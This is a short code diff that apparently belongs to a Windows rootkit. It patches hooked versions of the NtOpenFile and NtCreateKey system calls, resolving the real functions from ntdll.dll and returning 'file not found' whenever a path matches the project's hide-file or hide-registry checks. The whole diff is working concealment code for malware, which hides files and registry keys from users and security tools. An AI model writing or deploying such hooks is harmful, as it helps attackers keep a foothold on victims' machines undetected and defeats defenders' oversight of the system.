@@ -31,6 +31,17 @@ typedef struct _OBJECT_ATTRIBUTES {
     PVOID           SecurityQualityOfService;
 }  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
 
+typedef NTSTATUS(__stdcall *pNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
+
+typedef NTSTATUS(*pNtCreateKey)(__out PHANDLE KeyHandle,
+	__in ACCESS_MASK DesiredAccess,
+	__in POBJECT_ATTRIBUTES ObjectAttributes,
+	__reserved ULONG TitleIndex,
+	__in_opt PUNICODE_STRING Class,
+	__in ULONG CreateOptions,
+	__out_opt PULONG Disposition);
+
+
 typedef NTSTATUS(__stdcall *_NtCreateFile)(
     PHANDLE FileHandle,
     ACCESS_MASK DesiredAccess,
@@ -85,10 +96,10 @@ NTSTATUS NTAPI NewNtOpenFile(
 	DWORD dwRet;
 	
 	dwRet = GetFinalPathNameByHandle(*phFile, sPath, MAX_PATH, VOLUME_NAME_NONE);
-
+	pNtOpenFile NtOpenFile = (pNtOpenFile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenFile");
 	if (!mustHideFile(*sPath))
 		return NtOpenFile(phFile, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
-    return STATUS_NO_SUCH_FILE;
+	return 0xC000000F; // STATUS_NO_SUCH_FILE
 }
 
 /* use with 
@@ -112,7 +123,8 @@ NTSTATUS NTAPI NewNtCreateKey(
 	
 	dwRet = GetFinalPathNameByHandle(*KeyHandle, sPath, MAX_PATH, VOLUME_NAME_NONE);
 
+	pNtCreateKey NtCreateKey = (pNtCreateKey) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateKey");
 	if (!mustHideReg(*sPath))
 		return NtCreateKey(KeyHandle, DesiredAccess, ObjectAttributes, TitleIndex, Class, CreateOptions, Disposition);
-	return STATUS_NO_SUCH_FILE;
+	return 0xC000000F; // STATUS_NO_SUCH_FILE
 }
